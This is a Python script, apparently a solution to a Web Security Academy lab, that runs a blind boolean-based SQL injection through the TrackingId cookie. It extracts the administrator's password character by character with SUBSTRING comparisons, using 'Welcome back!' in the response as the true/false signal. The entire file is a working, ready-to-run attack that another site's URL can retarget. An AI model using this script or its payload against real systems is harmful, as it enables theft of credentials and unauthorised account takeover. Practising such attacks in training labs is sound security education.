import requests
import string

lab_url = "https://0af4009b04538391821a331f00db00b2.web-security-academy.net/"

asciis = [char for char in string.printable if char not in "\r\n"]

result = ""

for i in range(1, 50):
    found = False

    for char in asciis:
        if char == "'":
            continue

        payload = (
            f"' OR (SELECT COUNT(*) FROM users "
            f"WHERE username='administrator' "
            f"AND SUBSTRING(password, {i}, 1) = '{char}') > 0--"
        )

        cookie = {"TrackingId": payload}
        response = requests.get(lab_url, cookies=cookie)

        if "Welcome back!" in response.text:
            print(f"Position {i}: {char}")
            result += char
            found = True
            break

    if not found:
        print(f"No character found at position {i}. Stopping.")
        break

print("Result:", result)